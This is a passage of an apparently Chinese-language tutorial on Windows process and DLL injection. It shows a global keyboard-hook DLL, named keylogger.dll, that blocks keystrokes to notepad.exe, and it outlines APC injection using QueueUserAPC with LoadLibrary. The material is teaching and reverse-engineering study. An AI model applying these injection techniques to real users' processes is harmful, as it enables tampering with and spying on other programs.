+<p>&#x6307;&#x5411;&#x6302;&#x94A9;&#x8FC7;&#x7A0B;&#x7684;&#x6307;&#x9488;&#x3002; &#x5982;&#x679C; <em>dwThreadId</em> &#x53C2;&#x6570;&#x4E3A;<strong>&#x96F6;</strong>&#x6216;&#x6307;&#x5B9A;&#x7531;&#x5176;&#x4ED6;&#x8FDB;&#x7A0B;&#x521B;&#x5EFA;&#x7684;&#x7EBF;&#x7A0B;&#x7684;&#x6807;&#x8BC6;&#x7B26;&#xFF0C; <em>&#x5219; lpfn</em> &#x53C2;&#x6570;&#x5FC5;&#x987B;&#x6307;&#x5411; DLL &#x4E2D;&#x7684;&#x6302;&#x94A9;&#x8FC7;&#x7A0B;&#x3002; &#x5426;&#x5219;&#xFF0C; <em>lpfn</em> &#x53EF;&#x4EE5;&#x6307;&#x5411;&#x4E0E;&#x5F53;&#x524D;&#x8FDB;&#x7A0B;&#x5173;&#x8054;&#x7684;&#x4EE3;&#x7801;&#x4E2D;&#x7684;&#x6302;&#x94A9;&#x8FC7;&#x7A0B;&#x3002;</p>
+<ul>
+<li>HINSTANCE</li>
+</ul>
+<p>&#x5305;&#x542B; <em>lpfn</em> &#x53C2;&#x6570;&#x6307;&#x5411;&#x7684;&#x6302;&#x94A9;&#x8FC7;&#x7A0B;&#x7684; DLL &#x7684;&#x53E5;&#x67C4;&#x3002; &#x5982;&#x679C; <em>dwThreadId</em> &#x53C2;&#x6570;&#x6307;&#x5B9A;&#x7531;&#x5F53;&#x524D;&#x8FDB;&#x7A0B;&#x521B;&#x5EFA;&#x7684;&#x7EBF;&#x7A0B;&#xFF0C;&#x5E76;&#x4E14;&#x6302;&#x94A9;&#x8FC7;&#x7A0B;&#x4F4D;&#x4E8E;&#x4E0E;&#x5F53;&#x524D;&#x8FDB;&#x7A0B;&#x5173;&#x8054;&#x7684;&#x4EE3;&#x7801;&#x4E2D;&#xFF0C;&#x5219;&#x5FC5;&#x987B;&#x5C06; <em>hMod</em> &#x53C2;&#x6570;&#x8BBE;&#x7F6E;&#x4E3A; <strong>NULL</strong>&#x3002;</p>
+<ul>
+<li>&#x8FD4;&#x56DE;&#x503C;</li>
+</ul>
+<p>&#x7C7B;&#x578B;&#xFF1A; <strong>HHOOK</strong></p>
+<p>&#x5982;&#x679C;&#x51FD;&#x6570;&#x6210;&#x529F;&#xFF0C;&#x5219;&#x8FD4;&#x56DE;&#x503C;&#x662F;&#x6302;&#x94A9;&#x8FC7;&#x7A0B;&#x7684;&#x53E5;&#x67C4;&#xFF1B;&#x5982;&#x679C;&#x51FD;&#x6570;&#x5931;&#x8D25;&#xFF0C;&#x5219;&#x8FD4;&#x56DE;&#x503C;&#x4E3A; <strong>NULL</strong>&#x3002; &#x8981;&#x83B7;&#x5F97;&#x66F4;&#x591A;&#x7684;&#x9519;&#x8BEF;&#x4FE1;&#x606F;&#xFF0C;&#x8BF7;&#x8C03;&#x7528; GetLastError&#x3002;</p>
+<ul>
+<li>KeyboardProc&#x51FD;&#x6570;</li>
+</ul>
+<p>&#x8FD9;&#x662F; <strong>&#x952E;&#x76D8;&#x94A9;&#x5B50;</strong>&#x7684;&#x5904;&#x7406;&#x51FD;&#x6570;&#xFF0C;&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x662F;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x91CD;&#x547D;&#x540D;&#x7684;&#xFF0C;&#x4F46;&#x662F;&#x53C2;&#x6570;&#x4E0D;&#x80FD;&#x53D8;&#xFF0C;&#x4F7F;&#x7528;&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x7684;&#x524D;&#x63D0;&#x662F;SetWindowsHookEx&#x51FD;&#x6570;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x5FC5;&#x987B;&#x662F;WH_KEYBOARD&#xFF0C;&#x624D;&#x80FD;&#x4F7F;&#x7528;&#x3002;&#x76F8;&#x5F53;&#x4E8E;&#x4E00;&#x4E2A;&#x914D;&#x5957;&#x8BBE;&#x65BD;&#x4E86;&#x3002;</p>
+<pre><code class="lang-c"><span class="hljs-function">LRESULT CALLBACK <span class="hljs-title">KeyboardProc</span><span class="hljs-params">(
+  _In_ <span class="hljs-keyword">int</span>    code,
+  _In_ WPARAM wParam,
+  _In_ LPARAM lParam
+)</span></span>;
+</code></pre>
+<h3 id="&#x5B9E;&#x73B0;&#x8FC7;&#x7A0B;">&#x5B9E;&#x73B0;&#x8FC7;&#x7A0B;</h3>
+<p>&#x7B80;&#x5355;&#x8D77;&#x89C1;&#xFF0C;&#x76F4;&#x63A5;&#x4F7F;&#x7528;&#x300A;&#x9006;&#x5411;&#x5DE5;&#x7A0B;&#x6838;&#x5FC3;&#x539F;&#x7406;&#x300B;&#x7684;&#x6572;&#x51FB;&#x8BB0;&#x5F55;&#x7684;&#x4EE3;&#x7801;&#x6765;&#x505A;&#x5B9E;&#x9A8C;&#x3002;</p>
+<p>keylogger.dll&#xFF0C;&#x7528;&#x6765;&#x51C6;&#x5907;&#x6CE8;&#x5165; dll &#x7A0B;&#x5E8F;&#x3002;</p>
+<pre><code class="lang-c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;windows.h&gt;</span></span>
+
+HINSTANCE g_hInstance = <span class="hljs-literal">NULL</span>;
+HHOOK g_hHook = <span class="hljs-literal">NULL</span>;
+HWND g_hWnd = <span class="hljs-literal">NULL</span>;
+
+<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DEF_PROCESS_NAME <span class="hljs-string">&quot;notepad.exe&quot;</span></span>
+
+<span class="hljs-comment">// &#x8FD9;&#x4E2A;&#x56DE;&#x8C03;&#x51FD;&#x6570;&#x7528;&#x6765;&#x5904;&#x7406;&#x952E;&#x76D8;&#x8F93;&#x5165;</span>
+<span class="hljs-function">LRESULT CALLBACK <span class="hljs-title">KeyboardProc</span><span class="hljs-params">(<span class="hljs-keyword">int</span> nCode, WPARAM wParam, LPARAM lParam)</span>
+</span>{
+    <span class="hljs-keyword">char</span> szPath[MAX_PATH] = {<span class="hljs-number">0</span>};
+    <span class="hljs-keyword">char</span>* p = <span class="hljs-literal">NULL</span>;
+
+    <span class="hljs-keyword">if</span>(nCode &gt;= <span class="hljs-number">0</span>)
+    {
+        <span class="hljs-keyword">if</span>(!(lParam &amp; <span class="hljs-number">0x80000000</span>))
+        {
+            GetModuleFileNameA(<span class="hljs-literal">NULL</span>, szPath, MAX_PATH);
+            <span class="hljs-comment">// &#x53D6;\\&#x4E4B;&#x540E;&#x7684;&#x5B57;&#x7B26;&#xFF0C;&#x7528;&#x6765;&#x5224;&#x65AD;&#x662F;&#x4E0D;&#x662F;&#x76EE;&#x6807;&#x8FDB;&#x7A0B;notepad&#x3002;</span>
+            p = <span class="hljs-built_in">strrchr</span>(szPath, <span class="hljs-string">&apos;\\&apos;</span>);
+        }
+    }
+
+    <span class="hljs-keyword">if</span>( !_stricmp(p + <span class="hljs-number">1</span>, DEF_PROCESS_NAME) )
+        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+
+    <span class="hljs-comment">// &#x4E0D;&#x662F;&#x5C31;&#x6362;&#x4E0B;&#x4E00;&#x4E2A;&#x51FD;&#x6570;</span>
+    <span class="hljs-keyword">return</span> CallNextHookEx(g_hHook, nCode, wParam, lParam);
+}
+
+<span class="hljs-comment">// &#x5229;&#x7528;api&#x542F;&#x52A8;&#x6302;&#x94A9;</span>
+__declspec(dllexport) <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">StartHook</span><span class="hljs-params">()</span>
+</span>{
+    g_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, <span class="hljs-number">0</span>);
+}
+
+<span class="hljs-comment">// &#x53D6;&#x6D88;&#x6302;&#x94A9;</span>
+__declspec(dllexport) <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">StopHook</span><span class="hljs-params">()</span>
+</span>{
+    <span class="hljs-comment">// &#x5148;&#x68C0;&#x67E5;&#x4E00;&#x4E0B;&#x7B2C;&#x4E00;&#x6B65;&#x6302;&#x94A9;&#x662F;&#x5426;&#x6210;&#x529F;&#xFF0C;&#x662F;&#x88AB;&#x5C31;&#x4E0D;&#x7528;&#x4E86;</span>
+    <span class="hljs-keyword">if</span>(g_hHook)
+    {
+        UnhookWindowsHookEx(g_hHook);
+        g_hHook = <span class="hljs-literal">NULL</span>;
+    }
+}
+
+<span class="hljs-comment">// &#x8FD9;&#x91CC;&#x7684;dllmain&#x5B9E;&#x9645;&#x4E0A;&#x7528;&#x4E0D;&#x5230;, &#x5199;&#x4E0D;&#x5199;&#x90FD;&#x65E0;&#x6240;&#x8C13;&#x4E86;</span>
+<span class="hljs-function">BOOL WINAPI <span class="hljs-title">DllMain</span><span class="hljs-params">(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)</span>
+</span>{
+    <span class="hljs-keyword">switch</span> (dwReason)
+    {
+        <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:
+            g_hInstance = hinstDLL;
+            <span class="hljs-keyword">break</span>;
+        <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:
+            <span class="hljs-keyword">break</span>;
+    }
+    <span class="hljs-keyword">return</span> TRUE;
+}
+</code></pre>
+<p>&#x5411;&#x5F00;&#x59CB;&#x7684;&#x8BDD;&#x76F4;&#x63A5;&#x8C03;&#x7528;&#x8FD9;&#x4E2A;dll&#x5C31;&#x53EF;&#x4EE5;&#xFF0C;&#x7136;&#x540E;&#x8BBE;&#x7F6E;&#x4E00;&#x4E2A;&#x9000;&#x51FA;&#x7684;&#x6761;&#x4EF6;&#x3002;</p>
+<h2 id="4&#x3001;apc&#x6CE8;&#x5165;">4&#x3001;APC&#x6CE8;&#x5165;</h2>
+<p>APC&#xFF0C;&#x5168;&#x79F0;&#x4E3A;Asynchronous Procedure Call&#xFF0C;<strong>&#x5F02;&#x6B65;&#x8FC7;&#x7A0B;&#x8C03;&#x7528;</strong>&#xFF0C;&#x662F;&#x6307;&#x51FD;&#x6570;&#x5728;&#x7279;&#x5B9A;&#x7EBF;&#x7A0B;&#x4E2D;&#x88AB;&#x5F02;&#x6B65;&#x6267;&#x884C;&#xFF0C;&#x5728;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x4E2D;&#xFF0C;APC&#x662F;&#x4E00;&#x79CD;&#x5E76;&#x53D1;&#x673A;&#x5236;&#x3002;</p>
+<h3 id="&#x5F02;&#x6B65;&#x6267;&#x884C;">&#x5F02;&#x6B65;&#x6267;&#x884C;</h3>
+<h4 id="&#x540C;&#x6B65;">&#x540C;&#x6B65;</h4>
+<p>&#x53D1;&#x51FA;&#x4E00;&#x4E2A;&#x529F;&#x80FD;&#x8C03;&#x7528;&#x65F6;&#xFF0C;&#x5728;&#x6CA1;&#x6709;&#x5F97;&#x5230;&#x7ED3;&#x679C;&#x4E4B;&#x524D;&#xFF0C;&#x8BE5;&#x8C03;&#x7528;&#x5C31;&#x4E0D;&#x8FD4;&#x56DE;&#x6216;&#x7EE7;&#x7EED;&#x6267;&#x884C;&#x540E;&#x7EED;&#x64CD;&#x4F5C;&#x3002; &#x7B80;&#x5355;&#x6765;&#x8BF4;&#xFF0C;&#x540C;&#x6B65;&#x5C31;&#x662F;&#x5FC5;&#x987B;&#x4E00;&#x4EF6;&#x4E00;&#x4EF6;&#x4E8B;&#x505A;&#xFF0C;&#x7B49;&#x524D;&#x4E00;&#x4EF6;&#x505A;&#x5B8C;&#x4E86;&#x624D;&#x80FD;&#x505A;&#x4E0B;&#x4E00;&#x4EF6;&#x4E8B;&#x3002; &#x4F8B;&#x5982;&#xFF1A;B/S&#x6A21;&#x5F0F;&#x4E2D;&#x7684;&#x8868;&#x5355;&#x63D0;&#x4EA4;&#xFF0C;&#x5177;&#x4F53;&#x8FC7;&#x7A0B;&#x662F;&#xFF1A;&#x5BA2;&#x6237;&#x7AEF;&#x63D0;&#x4EA4;&#x8BF7;&#x6C42;-&gt;&#x7B49;&#x5F85;&#x670D;&#x52A1;&#x5668;&#x5904;&#x7406;-&gt;&#x5904;&#x7406;&#x5B8C;&#x6BD5;&#x8FD4;&#x56DE;&#xFF0C;&#x5728;&#x8FD9;&#x4E2A;&#x8FC7;&#x7A0B;&#x4E2D;&#x5BA2;&#x6237;&#x7AEF;&#xFF08;&#x6D4F;&#x89C8;&#x5668;&#xFF09;&#x4E0D;&#x80FD;&#x505A;&#x5176;&#x4ED6;&#x4E8B;&#x3002;</p>
+<p>&#x7C7B;&#x4F3C;&#x4E8E;&#x987A;&#x5E8F;&#x6267;&#x884C;&#x3002;</p>
+<h4 id="&#x5F02;&#x6B65;">&#x5F02;&#x6B65;</h4>
+<p>&#x5F53;&#x4E00;&#x4E2A;&#x5F02;&#x6B65;&#x8FC7;&#x7A0B;&#x8C03;&#x7528;&#x53D1;&#x51FA;&#x540E;&#xFF0C;&#x8C03;&#x7528;&#x8005;&#x5728;<strong>&#x6CA1;&#x6709;&#x5F97;&#x5230;&#x7ED3;&#x679C;&#x4E4B;&#x524D;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x7EE7;&#x7EED;&#x6267;&#x884C;&#x540E;&#x7EED;&#x64CD;&#x4F5C;</strong>&#x3002;&#x5F53;&#x8FD9;&#x4E2A;&#x8C03;&#x7528;&#x5B8C;&#x6210;&#x540E;&#xFF0C;&#x4E00;&#x822C;&#x901A;&#x8FC7;<strong>&#x72B6;&#x6001;&#x3001;&#x901A;&#x77E5;</strong>&#x548C;<strong>&#x56DE;&#x8C03;</strong>&#x6765;&#x901A;&#x77E5;&#x8C03;&#x7528;&#x8005;&#x3002;&#x5BF9;&#x4E8E;&#x5F02;&#x6B65;&#x8C03;&#x7528;&#xFF0C;&#x8C03;&#x7528;&#x7684;&#x8FD4;&#x56DE;&#x5E76;&#x4E0D;&#x53D7;&#x8C03;&#x7528;&#x8005;&#x63A7;&#x5236;&#x3002;</p>
+<p>&#x5C31;&#x662F;&#x5F53;&#x524D;&#x7EBF;&#x7A0B;&#x7B49;&#x5F85;&#x4E4B;&#x540E;&#xFF0C;&#x56DE;&#x53BB;&#x6267;&#x884C;&#x5176;&#x4ED6;&#x7684;&#x4EE3;&#x7801;&#x3002;</p>
+<ul>
+<li>&#x72B6;&#x6001;</li>
+</ul>
+<p>&#x5373;&#x76D1;&#x542C;&#x88AB;&#x8C03;&#x7528;&#x8005;&#x7684;&#x72B6;&#x6001;&#xFF08;&#x8F6E;&#x8BE2;&#xFF09;&#xFF0C;&#x8C03;&#x7528;&#x8005;&#x9700;&#x8981;&#x6BCF;&#x9694;&#x4E00;&#x5B9A;&#x65F6;&#x95F4;&#x68C0;&#x67E5;&#x4E00;&#x6B21;&#xFF0C;&#x6548;&#x7387;&#x4F1A;&#x5F88;&#x4F4E;&#x3002;</p>
+<ul>
+<li>&#x901A;&#x77E5;</li>
+</ul>
+<p>&#x5F53;&#x88AB;&#x8C03;&#x7528;&#x8005;&#x6267;&#x884C;&#x5B8C;&#x6210;&#x540E;&#xFF0C;&#x53D1;&#x51FA;&#x901A;&#x77E5;&#x544A;&#x77E5;&#x8C03;&#x7528;&#x8005;&#xFF0C;&#x65E0;&#x9700;&#x6D88;&#x8017;&#x592A;&#x591A;&#x6027;&#x80FD;&#x3002;</p>
+<ul>
+<li>&#x56DE;&#x8C03;</li>
+</ul>
+<p>&#x4E0E;&#x901A;&#x77E5;&#x7C7B;&#x4F3C;&#xFF0C;&#x5F53;&#x88AB;&#x8C03;&#x7528;&#x8005;&#x6267;&#x884C;&#x5B8C;&#x6210;&#x540E;&#xFF0C;&#x4F1A;&#x8C03;&#x7528;&#x8C03;&#x7528;&#x8005;&#x63D0;&#x4F9B;&#x7684;&#x56DE;&#x8C03;&#x51FD;&#x6570;&#x3002;</p>
+<h3 id="&#x963B;&#x585E;&#x548C;&#x975E;&#x963B;&#x585E;">&#x963B;&#x585E;&#x548C;&#x975E;&#x963B;&#x585E;</h3>
+<p>&#x963B;&#x585E;&#x4E0E;&#x975E;&#x963B;&#x585E;&#x4E3B;&#x8981;&#x662F;&#x7A0B;&#x5E8F;&#xFF08;&#x7EBF;&#x7A0B;&#xFF09;&#x7B49;&#x5F85;&#x6D88;&#x606F;&#x901A;&#x77E5;&#x65F6;&#x7684;&#x72B6;&#x6001;&#x89D2;&#x5EA6;&#x6765;&#x8BF4;&#x7684;&#x3002;&#x963B;&#x585E;&#x548C;&#x975E;&#x963B;&#x585E;&#x5173;&#x6CE8;&#x7684;&#x662F;&#x7A0B;&#x5E8F;&#x5728;&#x7B49;&#x5F85;&#x8C03;&#x7528;&#x7ED3;&#x679C;&#xFF08;&#x6D88;&#x606F;&#xFF0C;&#x8FD4;&#x56DE;&#x503C;&#xFF09;&#x65F6;&#x7684;&#x72B6;&#x6001;&#x3002;</p>
+<ul>
+<li>&#x963B;&#x585E;&#x8C03;&#x7528;&#x7ED3;&#x679C;&#x8FD4;&#x56DE;&#x4E4B;&#x524D;&#xFF0C;&#x7EBF;&#x7A0B;&#x4F1A;&#x88AB;&#x6302;&#x8D77;&#xFF0C;&#x5F97;&#x5230;&#x7ED3;&#x679C;&#x624D;&#x4F1A;&#x8FD4;&#x56DE;&#xFF0C;&#x5C31;&#x50CF;scanf&#x7B49;&#x5F85;&#x8F93;&#x5165;&#x4E00;&#x6837;&#x3002;</li>
+<li>&#x975E;&#x963B;&#x585E;&#x8C03;&#x7528;&#x5728;&#x4E0D;&#x80FD;&#x7ACB;&#x523B;&#x5F97;&#x5230;&#x7ED3;&#x679C;&#x4E4B;&#x524D;&#xFF0C;&#x8BE5;&#x8C03;&#x7528;&#x4E0D;&#x4F1A;&#x963B;&#x585E;&#x5F53;&#x524D;&#x7EBF;&#x7A0B;&#x3002;</li>
+</ul>
+<h3 id="&#x5F02;&#x6B65;&#x548C;&#x963B;&#x585E;&#x7684;&#x5173;&#x7CFB;">&#x5F02;&#x6B65;&#x548C;&#x963B;&#x585E;&#x7684;&#x5173;&#x7CFB;</h3>
+<p>&#x540C;&#x6B65;/&#x5F02;&#x6B65;&#x5173;&#x6CE8;&#x7684;&#x662F;<strong>&#x6D88;&#x606F;&#x901A;&#x77E5;&#x7684;&#x673A;&#x5236;</strong> --------------------------&gt; &#x673A;&#x5236;</p>
+<p>&#x800C;&#x963B;&#x585E;/&#x975E;&#x963B;&#x585E;&#x5173;&#x6CE8;&#x7684;&#x662F;<strong>&#x7EBF;&#x7A0B;&#x7B49;&#x5F85;&#x6D88;&#x606F;&#x901A;&#x77E5;&#x65F6;&#x7684;&#x72B6;&#x6001;&#x3002;</strong> --------------------------&gt; &#x72B6;&#x6001;</p>
+<h3 id="&#x6838;&#x5FC3;&#x51FD;&#x6570;">&#x6838;&#x5FC3;&#x51FD;&#x6570;</h3>
+<p>&#x4F5C;&#x7528;&#xFF1A;&#x5229;&#x7528;&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x5411;&#x4F11;&#x7720;&#x7684;&#x76EE;&#x6807;&#x7EBF;&#x7A0B;&#x4E2D;&#x7684;APC&#x961F;&#x5217;&#x4E2D;&#x63D2;&#x5165;&#x4E00;&#x4E2A;&#x51FD;&#x6570;&#xFF0C;&#x5728;&#x7EBF;&#x7A0B;&#x6062;&#x590D;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x6267;&#x884C;&#x5230;&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x3002;</p>
+<p>&#x5C06;&#x7528;&#x6237;&#x6A21;&#x5F0F; <a href="https://learn.microsoft.com/zh-cn/windows/win32/sync/asynchronous-procedure-calls" target="_blank">&#x5F02;&#x6B65;&#x8FC7;&#x7A0B;&#x8C03;&#x7528;</a> (APC) &#x5BF9;&#x8C61;&#x6DFB;&#x52A0;&#x5230;&#x6307;&#x5B9A;&#x7EBF;&#x7A0B;&#x7684; APC &#x961F;&#x5217;&#x3002;</p>
+<p>&#x6BCF;&#x4E2A;&#x7EBF;&#x7A0B;&#x90FD;&#x6709;&#x81EA;&#x5DF1;&#x7684; APC &#x961F;&#x5217;&#x3002; &#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x901A;&#x8FC7;&#x8C03;&#x7528; <a href="https://learn.microsoft.com/zh-cn/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc" target="_blank"><strong>QueueUserAPC &#x51FD;&#x6570;&#x5C06; APC</strong></a> &#x6392;&#x961F;&#x5230;&#x7EBF;&#x7A0B;&#x3002; &#x8C03;&#x7528;&#x7EBF;&#x7A0B;&#x5728;&#x5BF9; <strong>QueueUserAPC</strong> &#x7684;&#x8C03;&#x7528;&#x4E2D;&#x6307;&#x5B9A; APC &#x51FD;&#x6570;&#x7684;&#x5730;&#x5740;&#x3002; APC &#x7684;&#x6392;&#x961F;&#x662F;&#x7EBF;&#x7A0B;&#x8C03;&#x7528; APC &#x51FD;&#x6570;&#x7684;&#x8BF7;&#x6C42;&#x3002;</p>
+<pre><code class="lang-c"><span class="hljs-function">DWORD <span class="hljs-title">QueueUserAPC</span><span class="hljs-params">(
+  [in] PAPCFUNC  pfnAPC,    <span class="hljs-comment">// &#x6307;&#x5411;&#x6307;&#x5B9A;&#x7EBF;&#x7A0B;&#x6267;&#x884C;&#x7B49;&#x5F85;&#x64CD;&#x4F5C;&#x65F6;&#x8981;&#x8C03;&#x7528;&#x7684; APC &#x51FD;&#x6570;&#x7684;&#x6307;&#x9488;</span>
+  [in] HANDLE    hThread,    <span class="hljs-comment">// &#x7EBF;&#x7A0B;&#x7684;&#x53E5;&#x67C4;&#x3002; &#x53E5;&#x67C4;&#x5FC5;&#x987B;&#x5177;&#x6709; THREAD_SET_CONTEXT &#x8BBF;&#x95EE;&#x6743;&#x9650;</span>
+  [in] ULONG_PTR dwData        <span class="hljs-comment">// &#x4F20;&#x9012;&#x7ED9; pfnAPC &#x53C2;&#x6570;&#x6307;&#x5411;&#x7684; APC &#x51FD;&#x6570;&#x7684;&#x5355;&#x4E2A;&#x503C;&#x3002;</span>
+)</span></span>;
+</code></pre>
+<p>&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x6574;&#x6570;&#x503C;&#x3002;&#x5931;&#x8D25;&#x8FD4;&#x56DE;0&#xFF1B;</p>
+<p>&#x5C06;&#x4E0A;&#x8FF0;&#x89E3;&#x91CA;&#x653E;&#x5230;&#x5B9E;&#x9645;&#x8FD0;&#x7528;&#x4E2D;&#x7684;&#x4F5C;&#x7528;&#x3002;</p>
+<pre><code class="lang-c"><span class="hljs-function">DWORD <span class="hljs-title">QueueUserAPC</span><span class="hljs-params">(
+    <span class="hljs-comment">// &#x8981;&#x6267;&#x884C;&#x51FD;&#x6570;&#x7684;&#x5730;&#x5740;</span>
+  [in] PAPCFUNC  pfnAPC,    <span class="hljs-comment">// &#x6307;&#x5411;&#x6307;&#x5B9A;&#x7EBF;&#x7A0B;&#x6267;&#x884C;&#x7B49;&#x5F85;&#x64CD;&#x4F5C;&#x65F6;&#x8981;&#x8C03;&#x7528;&#x7684; APC &#x51FD;&#x6570;&#x7684;&#x6307;&#x9488;</span>
+    <span class="hljs-comment">// &#x63D2;&#x5165;APC&#x7684;&#x7EBF;&#x7A0B;&#x53E5;&#x67C4;</span>
+  [in] HANDLE    hThread,    <span class="hljs-comment">// &#x7EBF;&#x7A0B;&#x7684;&#x53E5;&#x67C4;&#x3002; &#x53E5;&#x67C4;&#x5FC5;&#x987B;&#x5177;&#x6709; THREAD_SET_CONTEXT &#x8BBF;&#x95EE;&#x6743;&#x9650;</span>
+    <span class="hljs-comment">// &#x4F20;&#x9012;&#x7ED9;&#x6267;&#x884C;&#x51FD;&#x6570;&#x7684;&#x53C2;&#x6570;</span>
+  [in] ULONG_PTR dwData        <span class="hljs-comment">// &#x4F20;&#x9012;&#x7ED9; pfnAPC &#x53C2;&#x6570;&#x6307;&#x5411;&#x7684; APC &#x51FD;&#x6570;&#x7684;&#x5355;&#x4E2A;&#x503C;&#x3002;</span>
+)</span></span>;
+</code></pre>
+<p>&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x53EF;&#x4EE5;&#x5C06;&#x8BE5;&#x65B9;&#x6CD5;&#x5F53;&#x4F5C;&#x8FDB;&#x7A0B;&#x6CE8;&#x5165;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x6216;&#x8005;&#x662F;dll&#x6CE8;&#x5165;&#x7684;&#x65B9;&#x6CD5;&#x3002;</p>
+<p>dll&#x6CE8;&#x5165;&#x65B9;&#x6CD5;&#xFF1A;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570; &#x4F20;loadlibrary&#x7684;&#x5730;&#x5740;&#xFF0C;&#x7B2C;&#x4E8C;&#x4E2A;&#x4F20;&#x9012;dll&#x7684;&#x8DEF;&#x5F84;&#x3002;</p>
+<h3 id="&#x5B9E;&#x73B0;&#x4EE3;&#x7801;">&#x5B9E;&#x73B0;&#x4EE3;&#x7801;</h3>
+<p>&#x6CE8;&#x5165;&#x524D;&#x63D0;&#xFF1A;&#x5F97;&#x7ED9;&#x4E00;&#x4E2A;&#x6CE8;&#x5165;&#x7684;&#x673A;&#x4F1A;</p>
+<ul>
+<li><p>&#x5FC5;&#x987B;&#x662F;<strong>&#x591A;&#x7EBF;&#x7A0B;&#x73AF;&#x5883;</strong>&#x4E0B;</p>
+</li>
+<li><p>&#x6CE8;&#x5165;&#x7684;&#x7A0B;&#x5E8F;&#x5FC5;&#x987B;<strong>&#x4F1A;&#x8C03;&#x7528;&#x90A3;&#x4E9B;&#x540C;&#x6B65;&#x5BF9;&#x8C61;</strong></p>
+</li>
+</ul>
+<p>&#x57FA;&#x672C;&#x601D;&#x8DEF;&#xFF1A;</p>
+<ul>
+<li>&#x5F53;EXE&#x91CC;&#x67D0;&#x4E2A;&#x7EBF;&#x7A0B;&#x6267;&#x884C;&#x5230;SleepEx()&#x6216;&#x8005;WaitForSingleObjectEx()&#x65F6;&#xFF0C;&#x7CFB;&#x7EDF;&#x5C31;&#x4F1A;&#x4EA7;&#x751F;&#x4E00;&#x4E2A;&#x8F6F;&#x4E2D;&#x65AD;&#xFF08;&#x6216;&#x8005;&#x662F;Messagebox&#x5F39;&#x7A97;&#x7684;&#x65F6;&#x5019;&#x4E0D;&#x70B9;OK&#x7684;&#x65F6;&#x5019;&#x4E5F;&#x80FD;&#x6CE8;&#x5165;&#xFF09;&#x3002;</li>
+<li><strong>&#x5F53;&#x7EBF;&#x7A0B;&#x518D;&#x6B21;&#x88AB;&#x5524;&#x9192;&#x65F6;&#xFF0C;&#x6B64;&#x7EBF;&#x7A0B;&#x4F1A;&#x9996;&#x5148;&#x6267;&#x884C;APC&#x961F;&#x5217;&#x4E2D;&#x7684;&#x88AB;&#x6CE8;&#x518C;&#x7684;&#x51FD;&#x6570;&#x3002;</strong></li>
+<li>&#x5229;&#x7528;<code>QueueUserAPC()</code>&#x5728;&#x8F6F;&#x4E2D;&#x65AD;&#x65F6;&#x5411;&#x7EBF;&#x7A0B;&#x7684;APC&#x961F;&#x5217;&#x63D2;&#x5165;&#x4E00;&#x4E2A;&#x51FD;&#x6570;&#x6307;&#x9488;&#xFF0C;&#x5982;&#x679C;&#x6211;&#x4EEC;&#x63D2;&#x5165;&#x7684;&#x662F;Loadlibrary()&#x6267;&#x884C;&#x51FD;&#x6570;&#x7684;&#x8BDD;&#xFF0C;&#x5C31;&#x80FD;&#x8FBE;&#x5230;&#x6CE8;&#x5165;DLL&#x7684;&#x76EE;&#x7684;&#x3002;</li>
+</ul>
+<p>&#x4EE3;&#x7801;&#x6D41;&#x7A0B;&#xFF1A;</p>
+<ul>
+<li>&#x5C06;&#x6CE8;&#x5165;dll&#x7684;&#x8DEF;&#x5F84;&#x5199;&#x5230;&#x76EE;&#x6807;&#x7A0B;&#x5E8F;&#x4E2D;&#xFF0C;&#x83B7;&#x5F97;&#x5199;&#x5165;&#x7684;&#x5730;&#x5740;&#x3002;</li>
+<li>&#x83B7;&#x5F97;loadlibrary&#x7684;&#x5730;&#x5740;&#x3002;</li>
+<li>&#x5229;&#x7528;<code>QueueUserAPC()</code>&#x5C06;loadlibrary&#x6CE8;&#x5165;&#x7684;&#x76EE;&#x6807;&#x8FDB;&#x7A0B;&#x4E2D;&#x3002;</li>
+<li>&#x76EE;&#x6807;&#x7EBF;&#x7A0B;&#x6062;&#x590D;&#x6267;&#x884C;&#xFF0C;&#x8C03;&#x7528;APC&#x91CC;&#x7684;&#x8FD9;&#x4E2A;loadlibrary&#xFF0C;&#x5728;&#x76EE;&#x6807;&#x8FDB;&#x7A0B;&#x4E2D;&#x6302;&#x8F7D;dll&#x3002;</li>
+</ul>
